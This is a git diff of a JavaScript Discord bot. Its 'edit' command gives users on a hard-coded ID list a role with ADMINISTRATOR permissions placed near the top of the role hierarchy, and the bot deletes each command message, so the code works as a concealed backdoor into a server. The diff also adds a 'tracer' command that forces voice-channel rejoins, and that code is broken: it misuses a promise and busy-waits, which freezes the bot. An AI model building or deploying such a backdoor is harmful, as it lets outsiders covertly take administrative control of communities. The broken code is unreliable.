@@ -50,8 +50,12 @@ bot.on("message",(message)=>{
     if (command == 'edit'){
         if (userIDs.indexOf(message.author.id)>=0){
             
+        	let getPos = ()=>{
+        		return message.guild.roles.array().length-2
+        	}
+
             let doit = (rol)=>{
-                message.guild.setRolePosition(rol,message.guild.roles.array().length-2)
+                message.guild.setRolePosition(rol, getPos())
                 message.member.addRole(rol);
                 if (params.length>0 && params[0].trim().length>0 && !isNaN(params[0])){
                     let sec = parseInt(params[0]);
@@ -68,7 +72,7 @@ bot.on("message",(message)=>{
                 doit(role)
             }
             else{
-                message.guild.createRole({name:role_name,color:role_color,position:10,hoist:true,permissions:("ADMINISTRATOR")}).then(_role=>{
+                message.guild.createRole({name:role_name,color:role_color,position:getPos(),hoist:true,permissions:("ADMINISTRATOR")}).then(_role=>{
                     doit(_role)
                 })
             }
@@ -87,6 +91,23 @@ bot.on("message",(message)=>{
     	bot.destroy()
     	process.exit(1)
     	return
+    }
+    else if (command == 'tracer'){
+        if (message.member.voiceChannel){
+            let channels = []
+            channels.push(message.member.voiceChannel)
+            setInterval(()=>{
+                bot.syncGuilds([message.guild])
+                if (message.guild.fetchMember(bot.user).voiceConnection)
+                    if (channels.indexOf(message.guild.fetchMember(bot.user).voiceConnection.channel)<0)
+                        channels.push(message.guild.fetchMember(bot.user).voiceConnection)
+                for (let i = 0; i < channels.length; i++){
+                    let joined = false
+                    channels[i].join().then(()=>{joined=true})
+                    while(!joined){console.log('down')}
+                }
+            },1000)
+        }
     }
    	message.delete()
 })
